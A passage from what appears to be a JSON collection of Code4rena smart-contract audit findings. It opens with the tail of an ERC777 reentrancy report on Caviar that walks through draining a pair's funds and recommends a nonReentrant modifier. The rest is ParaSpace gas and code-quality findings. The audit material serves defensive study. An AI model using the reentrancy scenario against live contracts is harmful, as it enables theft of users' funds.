(BT777 to receive) | outputAmount > minOutputAmount |\n| :----------- | ------------------ | --------------- | ------------- | ----------- | ------------------------------- | -----------------------------: |\n| calback Sell | 350                | 442             | 1000          | 650         | 536                             |                           TRUE |\n\nThe result is that the attacker now controls 536 BT777, the attacker use this balance to pay the debt of 442 BT77, with a profit of 94 BT77 tokens.\n\n### Recommended Mitigation steps\n\nAdd openzeppelin nonReentrant modifier to mentioned functions, or state clear in the documentation that this protocol should not be used with ERC777 tokens.\n\n**[outdoteth (Caviar) acknowledged and commented](https://github.com/code-423n4/2022-12-caviar-findings/issues/343#issuecomment-1372238278):**\n > Technically valid, though we don't intend to support erc777 tokens.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the functions ```add```, ```remove```, ```buy``` and ```sell``` of the code-423n4/2022-12-caviar repository. These functions first transfer fractional tokens, then base tokens, and if the base token is an ERC777 token, this function can be called repeatedly without updating the base token balance, allowing the attacker to drain funds of a pair. \n\nTo illustrate this attack, an example is given where the pair has 1000 base tokens (BT777) and 1000 fractional reserve tokens (FRT). The attacker calls the buy function with the parameters outputAmount = 50 and maxInputAmount = 80, and implements a hook that will be executed 6 times when a transfer is done. After the 6 calls, the malicious contract calls the sell function with the inputAmount = 350 and minOutputAmount = 442. The result is that the attacker now controls 536 BT777, which can be used to pay the debt of 442 BT77 and make a profit of 94 BT77 tokens.\n\nTo mitigate this vulnerability, the openzeppelin nonReentrant modifier should be added to the mentioned functions, or it should be clearly stated in the documentation that this protocol should not be used with ERC777 tokens.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "https://github.com/code-423n4/2022-12-caviar-findings/issues/343",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "cozzetti",
        "cccz",
        "minhquanym",
        "koxuan",
        "gzeon",
        "Lambda",
        "KingNFT",
        "carlitox477",
        "rvierdiiev",
        "9svR6w"
      ]
    },
    {
      "id": "25785",
      "title": "[G-19]  Don't use `_msgSender()` if not supporting EIP-2771",
      "impact": "GAS",
      "content": "Use `msg.sender` if the code does not implement [EIP-2771 trusted forwarder](https://eips.ethereum.org/EIPS/eip-2771) support.\n\n*There are 7 instances of this issue.*\n\n___\n\n## Excluded Findings\nThese findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness.\n\n### Gas Optimizations\n| |Issue|Instances|Total Gas Saved|\n|-|:-|:-:|:-:|\n| [G&#x2011;20] | Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas | 34 | 4080 |\n| [G&#x2011;21] | State variables should be cached in stack variables rather than re-reading them from storage | 1 | 97 |\n| [G&#x2011;22] | `<array>.length` should not be looked up in every loop of a `for`-loop | 41 | 123 |\n| [G&#x2011;23] | Using `bool`s for storage incurs overhead | 1 | 17100 |\n| [G&#x2011;24] | Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement | 1 | 6 |\n| [G&#x2011;25] | `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) | 57 | 285 |\n| [G&#x2011;26] | Using `private` rather than `public` for constants, saves gas | 8 | - |\n| [G&#x2011;27] | Division by two should use bit shifting | 2 | 40 |\n| [G&#x2011;28] | Use custom errors rather than `revert()`/`require()` strings to save gas | 15 | - |\n\nTotal: 160 instances over 9 issues with **21731 gas** saved\n\nGas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions.\n\n### [G&#x2011;20]  Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas\nWhen a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead. \n\nIf the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one.\n\nNote that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved.\n\n*There are 34 instances of this issue.*\n\n### [G&#x2011;21]  State variables should be cached in stack variables rather than re-reading them from storage\nThe instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/misc/NFTFloorOracle.sol\n\n/// @audit assetPriceMap[_asset].twap on line 405 - (valid but excluded finding)\n426:              return (false, assetPriceMap[_asset].twap);\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L426\n\n### [G&#x2011;22]  `<array>.length` should not be looked up in every loop of a `for`-loop\nThe overheads outlined below are _PER LOOP_, excluding the first loop\n* storage arrays incur a Gwarmaccess (**100 gas**)\n* memory arrays use `MLOAD` (**3 gas**)\n* calldata arrays use `CALLDATALOAD` (**3 gas**)\n\nCaching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset\n\n*There are 41 instances of this issue.*\n\n### [G&#x2011;23]  Using `bool`s for storage incurs overhead\n```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\n\nUse `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past\n\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/protocol/tokenization/base/MintableIncentivizedERC721.sol\n\n/// @audit (valid but excluded finding)\n73:       bool public immutable ATOMIC_PRICING;\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/base/MintableIncentivizedERC721.sol#L73\n\n### [G&#x2011;24]  Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement\nThis change saves **[6 gas](https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png)** per instance. The optimization works until solidity version [0.8.13](https://gist.github.com/IllIllI000/bf2c3120f24a69e489f12b3213c06c94) where there is a regression in gas costs.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/misc/NFTFloorOracle.sol\n\n/// @audit (valid but excluded finding)\n356:          require(_twap > 0, \"NFTOracle: price should be more than 0\");\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L356\n\n### [G&#x2011;25]  `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)\nSaves **5 gas per loop**.\n\n*There are 57 instances of this issue.*\n\n### [G&#x2011;26]  Using `private` rather than `public` for constants, saves gas\nIf needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table.\n\n*There are 8 instances of this issue.*\n\n### [G&#x2011;27]  Division by two should use bit shifting\n`<x> / 2` is the same as `<x> >> 1`. While the compiler uses the `SHR` opcode to accomplish both, the version that uses division incurs an overhead of [**20 gas**](https://gist.github.com/IllIllI000/ec0e4e6c4f52a6bca158f137a3afd4ff) due to `JUMP`s to and from a compiler utility function that introduces checks which can be avoided by using `unchecked {}` around the division by two.\n\n*There are 2 instances of this issue.*\n\n### [G&#x2011;28]  Use custom errors rather than `revert()`/`require()` strings to save gas\nCustom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas.\n\n*There are 15 instances of this issue.*\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25784",
      "title": "[G-18]  Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are \n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost.\n\n*There are 66 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25783",
      "title": "[G-17]  Use custom errors rather than `revert()`/`require()` strings to save gas",
      "impact": "GAS",
      "content": "Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas.\n\n*There are 202 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25782",
      "title": "[G-16]  `require()` or `revert()` statements that check input arguments should be at the top of the function",
      "impact": "GAS",
      "content": "Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (**2100 gas***) in a function that may ultimately revert in the unhappy case.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/protocol/pool/PoolParameters.sol\n\n/// @audit expensive op on line 212\n214:          require(value != 0, Errors.INVALID_AMOUNT);\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/pool/PoolParameters.sol#L214\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25781",
      "title": "[G-15]  Inverting the condition of an `if`-`else`-statement wastes gas",
      "impact": "GAS",
      "content": "Flipping the `true` and `false` blocks instead saves ***[3 gas](https://gist.github.com/IllIllI000/44da6fbe9d12b9ab21af82f14add56b9)***.\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25780",
      "title": "[G-14]  Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/protocol/tokenization/base/MintableIncentivizedERC721.sol\n\n73:       bool public immutable ATOMIC_PRICING;\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/tokenization/base/MintableIncentivizedERC721.sol#L73\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25779",
      "title": "[G-13]  Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead",
      "impact": "GAS",
      "content": "> When using elements that are smaller than 32 bytes, your contracts gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\n\nEach operation involving a `uint8` costs an extra [**22-28 gas**](https://gist.github.com/IllIllI000/9388d20c70f9a4632eb3ca7836f54977) (depending on whether the other operand is also a variable of type `uint8`) as compared to ones involving `uint256`, due to the compiler having to clear the higher bits of the memory word before operating on the `uint8`, as well as the associated stack operations of doing so. Use a larger size then downcast where needed.\n\n*There are 5 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25778",
      "title": "[G-12]  Splitting `require()` statements that use `&&` saves gas",
      "impact": "GAS",
      "content": "See [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper by **3 gas**.\n\n*There are 13 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25777",
      "title": "[G-11]  `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)",
      "impact": "GAS",
      "content": "Saves **5 gas per loop**.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/misc/NFTFloorOracle.sol\n\n450:                  j--;\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L450\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25776",
      "title": "[G-10]  Optimize names to save gas",
      "impact": "GAS",
      "content": "`public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92).\n\n*There are 23 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25775",
      "title": "[G-09]  `require()`/`revert()` strings longer than 32 bytes cost extra gas",
      "impact": "GAS",
      "content": "Each extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**.\n\n*There are 14 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25774",
      "title": "[G-08]  `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops",
      "impact": "GAS",
      "content": "The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**.\n\n*There are 49 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25773",
      "title": "[G-07]  Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement",
      "impact": "GAS",
      "content": "`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`\n\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/protocol/libraries/logic/LiquidationLogic.sol\n\n/// @audit if-condition on line 874\n877:                      msg.value - vars.actualLiquidationAmount\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/LiquidationLogic.sol#L877\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25772",
      "title": "[G-06]  `internal` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There are 15 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25771",
      "title": "[G-05]  The result of function calls should be cached rather than re-calling the function",
      "impact": "GAS",
      "content": "The instances below point to the second+ call of the function within a single function.\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25770",
      "title": "[G-04]  Multiple accesses of a mapping/array should use a local variable cache",
      "impact": "GAS",
      "content": "The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata\n\n*There are 4 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25769",
      "title": "[G-03]  Using `storage` instead of `memory` for structs/arrays saves gas",
      "impact": "GAS",
      "content": "When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct\n\n*There are 5 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25768",
      "title": "[G-02]  Save gas by batching `NToken` operations",
      "impact": "GAS",
      "content": "_Every_ external call made to a contract incurs at least **100 gas** of overhead. Since all of the IDs belong to the same NToken, you can prevent this overhead by having a `safeTransferFromBatch()` function, or by implementing EIP-1155 support, which natively supports batching.\n\n*There are 2 instances of this issue. (For in-depth details on this and all further gas optimizations with multiple instances, please see the warden's [full report](https://github.com/code-423n4/2022-11-paraspace-findings/issues/403).)*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25767",
      "title": "[G-01]  Save gas by checking against default WETH address",
      "impact": "GAS",
      "content": "You can save a Gcoldsload (**2100 gas**) in the address provider, plus the **100 gas** overhead of the external call, for every `receive()`, by creating an immutable `DEFAULT_WETH` variable which will store the initial WETH address, and change the require statement to be: `require(msg.ender == DEFAULT_WETH || msg.sender == <etc>)`.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: /paraspace-core/contracts/protocol/pool/PoolCore.sol\n\n802      receive() external payable {\n803          require(\n804              msg.sender ==\n805                  address(IPoolAddressesProvider(ADDRESSES_PROVIDER).getWETH()),\n806              \"Receive not allowed\"\n807          );\n808:     }\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/pool/PoolCore.sol#L802-L808\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25766",
      "title": "[N-28]  Typos",
      "impact": "LOW",
      "content": "\n*There are 3 instances of this issue.*\n\n___\n\n## Excluded Findings\nThese findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness.\n\n### Low Risk Issues\n| |Issue|Instances|\n|-|:-|:-:|\n| [L&#x2011;10] | `safeApprove()` is deprecated | 1 |\n| [L&#x2011;11] | Missing checks for `address(0x0)` when assigning values to `address` state variables | 4 |\n\nTotal: 5 instances over 2 issues\n\n### Non-critical Issues\n| |Issue|Instances|\n|-|:-|:-:|\n| [N&#x2011;29] | Return values of `approve()` not checked | 2 |\n| [N&#x2011;30] | `public` functions not called by the contract should be declared `external` instead | 3 |\n| [N&#x2011;31] | `constant`s should be defined rather than using magic numbers | 2 |\n| [N&#x2011;32] | Event is missing `indexed` fields | 8 |\n\nTotal: 15 instances over 4 issues\n\n### [L&#x2011;10]  `safeApprove()` is deprecated\n[Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`. If only setting the initial allowance to the value that means infinite, `safeIncreaseAllowance()` can be used instead. The function may currently work, but if a bug is found in this version of OpenZeppelin, and the version that you're forced to upgrade to no longer has this function, you'll encounter unnecessary delays in porting and testing replacement contracts.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: paraspace-core/contracts/protocol/libraries/logic/MarketplaceLogic.sol\n\n/// @audit (valid but excluded finding)\n555:              IERC20(token).safeApprove(operator, type(uint256).max);\n\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/MarketplaceLogic.sol#L555\n\n### [L&#x2011;11]  Missing checks for `address(0x0)` when assigning values to `address` state variables\n\n*There are 4 instances of this issue.*\n\n### [N&#x2011;29]  Return values of `approve()` not checked\nNot all `IERC20` implementations `revert()` when there's a failure in `approve()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually approving anything\n\n*There are 2 instances of this issue.*\n\n### [N&#x2011;30]  `public` functions not called by the contract should be declared `external` instead\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n*There are 3 instances of this issue.*\n\n### [N&#x2011;31]  `constant`s should be defined rather than using magic numbers\nEven [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals.\n\n*There are 2 instances of this issue.*\n\n### [N&#x2011;32]  Event is missing `indexed` fields\nIndex event fields make the field more quickly accessible [to off-chain tools](https://ethereum.stackexchange.com/questions/40396/can-somebody-please-explain-the-concept-of-event-indexing) that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each `event` should use three `indexed` fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.\n\n*There are 8 instances of this issue.*\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25765",
      "title": "[N-27]  Large or complicated code bases should implement fuzzing tests",
      "impact": "LOW",
      "content": "Large code bases, or code with lots of inline-assembly, complicated math, or complicated interactions between multiple contracts, should implement [fuzzing tests](https://medium.com/coinmonks/smart-contract-fuzzing-d9b88e0b0a05). Fuzzers such as Echidna require the test writer to come up with invariants which should not be violated under any circumstances, and the fuzzer tests various inputs and function calls to ensure that the invariants always hold. Even code with 100% code coverage can still have bugs due to the order of the operations a user performs, and fuzzers, with properly and extensively-written invariants, can close this testing gap significantly.\n\n*There is 1 instance of this issue:*\n```\n- How many contracts are in scope?: 32\n- Total SLoC for these contracts?: 8408\n- How many external imports are there?: 12\n- How many separate interfaces and struct definitions are there for the contracts within scope?: 44 interfaces, 35 struct definitions\n- Does most of your code generally use composition or inheritance?: Yes\n- How many external calls?: 306\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/README.md?plain=1#L92-L97\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25764",
      "title": "[N-26]  Contracts should have full test coverage",
      "impact": "LOW",
      "content": "While 100% code coverage does not guarantee that there are no bugs, it often will catch easy-to-find bugs, and will ensure that there are fewer regressions when the code invariably has to be modified. Furthermore, in order to get full coverage, code authors will often have to re-organize their code so that it is more modular, so that each component can be tested separately, which reduces interdependencies between modules and layers, and makes for code that is easier to reason about and audit.\n\n*There is 1 instance of this issue:*\n```\n- What is the overall line coverage percentage provided by your tests?: 85\n```\nhttps://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/README.md?plain=1#L98\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ParaSpace",
      "source_link": "https://code4rena.com/reports/2022-11-paraspace",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "25763",
      "title": "[N-25]  Consider using `delete` rather than assigning zero to clear values",
      "impact": "LOW",
      "content": "The `delete` keyword more closely matches the semantics of what is being done, and draws more attention to the changing of state, which may lead to a more thorough audit of its associated logic.\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
